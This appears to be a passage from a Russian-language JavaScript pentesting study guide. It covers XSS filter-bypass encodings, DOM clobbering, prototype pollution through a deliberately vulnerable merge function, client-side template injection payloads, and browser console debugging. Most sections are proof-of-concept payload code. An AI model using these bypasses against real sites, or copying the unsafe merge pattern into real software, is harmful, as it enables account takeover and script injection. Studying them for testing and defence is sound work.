// Через кодировки: \u0061lert, \x61lert

```javaScript
// Юникод-escape
\u0061lert(1) // alert(1)

// Hex escape
\x61lert(1) // alert(1)

// Восьмеричные (не в строгом режиме)
\141lert(1) // alert(1)

// Двойное кодирование
eval('\\x61lert(1)')

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров, ищущих "alert"
// 2. В разных контекстах работает по-разному
```

// Через комментарии: alert/**/(1)

```javaScript
// Комментарии внутри вызова
alert/**/(1) // работает!

// Многострочные
alert/*xss*/(1)

// С HTML комментариями (в старых браузерах)
<!--><script>alert(1)</script>

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров, ищущих alert(1)
// 2. Разрыв ключевых слов
```

// Через табы и переводы строк

```javaScript
// Пробельные символы внутри
alert\t(1) // таб
alert\n(1) // новая строка
alert\r(1) // возврат каретки
alert\f(1) // form feed

// В URL
javas\u0009cript:alert(1) // таб внутри "javascript"

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров, не учитывающих пробельные символы
// 2. В разных местах браузер игнорирует
```

// Через JavaScript без букв: [][(![]+[])[+[]]...

```javaScript
// JSFuck - использует только []!+ для создания кода
// Пример для alert(1)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+... // очень длинно

// Упрощенный пример
+[] // 0
!+[] // true
!![] // true
[][[]] // undefined

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров, блокирующих буквы
// 2. Может быть очень длинным, но работает
// 3. Генераторы: http://www.jsfuck.com/
```


**Для пентеста:** хлеб насущный

### 6.2 DOM Clobbering



// Переопределение глобальных переменных через DOM

```javaScript
// DOM clobbering - HTML может переопределять JS переменные
// Если в JS есть
if (window.user.isAdmin) { ... }

// А в HTML:
<div id="user"></div>
// Теперь window.user - ссылка на div, а не объект!
// user.isAdmin - undefined (ошибка может обойти проверку)

// ДЛЯ ПЕНТЕСТА:
// 1. Сломать JS логику через同名 id
```

// `<form id=x> <input name=y> => window.x.y` формы

```javaScript
// Специальное поведение форм
<form id="config">
    <input name="isAdmin" value="true">
</form>

// Теперь:
window.config // ссылка на форму
window.config.isAdmin // ссылка на input!
config.isAdmin.value // "true"

// Если в JS:
if (config.isAdmin) { // true, потому что input существует
    // опасный код
}

// ДЛЯ ПЕНТЕСТА:
// 1. Переопределение проверок
// 2. Внедрение ложных значений
```

// Двойное clobbering

```javaScript
// Вложенные clobbering
<form id="user">
    <input name="name" value="admin">
    <form id="user">
        <input name="role" value="admin">
    </form>
</form>

// ДЛЯ ПЕНТЕСТА:
// 1. Сложные переопределения
// 2. Обход через вложенные формы
```

// Обход проверок через collision

```javaScript
// Если JS проверяет
if (object.hasOwnProperty('xss')) {
    // безопасно
}

// Можно переопределить hasOwnProperty
<form id="hasOwnProperty">
    <input name="xss" value="payload">
</form>

// Теперь object.hasOwnProperty - не функция, а форма!
// object.hasOwnProperty('xss') - TypeError!

// ДЛЯ ПЕНТЕСТА:
// 1. Сломать проверки, переопределив методы
// 2. Использовать collision для обхода
```


**Для пентеста:** изменение логики JS через HTML

### 6.3 Prototype Pollution



// Изменение Object.prototype

```javaScript
// Загрязнение прототипа
Object.prototype.xss = 'payload';

// Теперь у ВСЕХ объектов есть xss
const obj = {};
console.log(obj.xss); // 'payload'

// ДЛЯ ПЕНТЕСТА:
// 1. Добавление свойств во все объекты
// 2. Может изменить логику приложения
```

// __proto__, constructor.prototype

```javaScript
// Через __proto__
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
// Если скопировать этот объект - прототип загрязнится

// Через constructor.prototype
const obj = {};
obj.constructor.prototype.polluted = true;

// ДЛЯ ПЕНТЕСТА:
// 1. Найти уязвимый merge/clone
// 2. Внедрить свойства через __proto__ в JSON
```

// Функции merge, clone

```javaScript
// Уязвимая функция merge
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Атака
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);
// Теперь все объекты имеют isAdmin: true

// ДЛЯ ПЕНТЕСТА:
// 1. Искать функции merge/clone/extend
// 2. Пробовать __proto__ как ключ
```

// Обход проверок через polluted свойства

```javaScript
// Проверка
function isAdmin(user) {
    return user.role === 'admin';
}

// После pollution
Object.prototype.role = 'admin';
const user = {};
console.log(isAdmin(user)); // true! обошли!

// Проверка на наличие свойства
if (user.token) { // если token есть в прототипе - true
    useToken(user.token);
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход проверок через прототип
// 2. Изменение глобального поведения
```


**Для пентеста:** изменение поведения всего приложения

### 6.4 Template Injection



// Клиентские шаблонизаторы

```javaScript
// Разные шаблонизаторы имеют свои синтаксисы
{{constructor.constructor('alert(1)')()}} // некоторые
{{7*7}} // выражение

// ДЛЯ ПЕНТЕСТА:
// 1. Пробовать разные синтаксисы: {{ }}, [[ ]], <%= %>
```

// Vue, Angular, React (опасные практики)

```javaScript
// Vue - v-html (опасно!)
<div v-html="userInput"></div> // XSS если userInput содержит HTML

// Angular - ng-bind-html
<div ng-bind-html="userInput"></div>

// React - dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ДЛЯ ПЕНТЕСТА:
// 1. Искать эти атрибуты в коде
// 2. Если они используются с пользовательским вводом - XSS
```

// v-html, dangerouslySetInnerHTML

```javaScript
// Vue
new Vue({
    template: `<div v-html="message"></div>`,
    data: { message: '<img src=x onerror=alert(1)>' }
}); // XSS!

// React
function Component({ input }) {
    return <div dangerouslySetInnerHTML={{__html: input}} />;
}
// <Component input="<img src=x onerror=alert(1)>" /> // XSS!

// ДЛЯ ПЕНТЕСТА:
// 1. Проверить, экранируется ли ввод
// 2. Если нет - XSS
```

// Выход из шаблонов

```javaScript
// Выход из контекста шаблона
{% raw %}
{{ '</script><script>alert(1)</script>' }}
{% endraw %}

// ДЛЯ ПЕНТЕСТА:
// 1. Пытаться закрыть теги и открыть новые
// 2. Использовать комментарии шаблонов
```


**Для пентеста:** SSTI на клиенте

---

## **БЛОК 7: TOOLING ДЛЯ ПЕНТЕСТА**

### 7.1 Консоль браузера



// console.log, info, warn, error, table, dir

```javaScript
console.log('обычный лог');
console.info('инфо');
console.warn('предупреждение');
console.error('ошибка');

// Для объектов
console.table([{name: 'XSS', value: 1}, {name: 'SQLi', value: 2}]);
console.dir(document.body); // как объект со свойствами

// ДЛЯ ПЕНТЕСТА:
// 1. Использовать для отладки эксплойтов
// 2. console.log может оставлять следы
```

// console.time, timeEnd

```javaScript
console.time('timer');
// ... код ...
console.timeEnd('timer'); // сколько времени прошло

// ДЛЯ ПЕНТЕСТА:
// 1. Тайминг-атаки
// 2. Измерение производительности
```

// console.trace

```javaScript
function a() { b(); }
function b() { console.trace(); }
a(); // покажет стек вызовов

// ДЛЯ ПЕНТЕСТА:
// 1. Понимание потока выполнения
// 2. Отладка сложных эксплойтов
```

// console.group, groupEnd

```javaScript
console.group('Группа');
console.log('внутри');
console.group('Подгруппа');
console.log('еще глубже');
console.groupEnd();
console.groupEnd();

// ДЛЯ ПЕНТЕСТА:
// 1. Организация вывода
```

// debugger (остановка выполнения)

```javaScript
debugger; // выполнение остановится, откроются девтулзы

// ДЛЯ ПЕНТЕСТА:
// 1. Остановка в нужном месте для анализа
// 2. Можно вставить в XSS для отладки
```

// $0 (последний элемент в инспекторе)

```javaScript
// В консоли браузера
$0 // последний выбранный элемент в инспекторе
$1 // предпоследний
$0.value // значение элемента

// ДЛЯ ПЕНТЕСТА:
// 1. Быстрый доступ к элементам
```

// $_ (последний результат)

```javaScript
// В консоли
1+1 // 2
$_ // 2
$_ + 5 // 7

// ДЛЯ ПЕНТЕСТА:
// 1. Удобно для последовательных операций
```

// monitorEvents

```javaScript
// В консоли
monitorEvents(window, 'resize'); // логировать все resize
monitorEvents(document.body, 'click'); // логировать клики
unmonitorEvents(window); // отключить

// ДЛЯ ПЕНТЕСТА:
// 1. Отслеживание событий для понимания приложения
```


**Для пентеста:** отладка эксплоитов


---









```javaScript
```



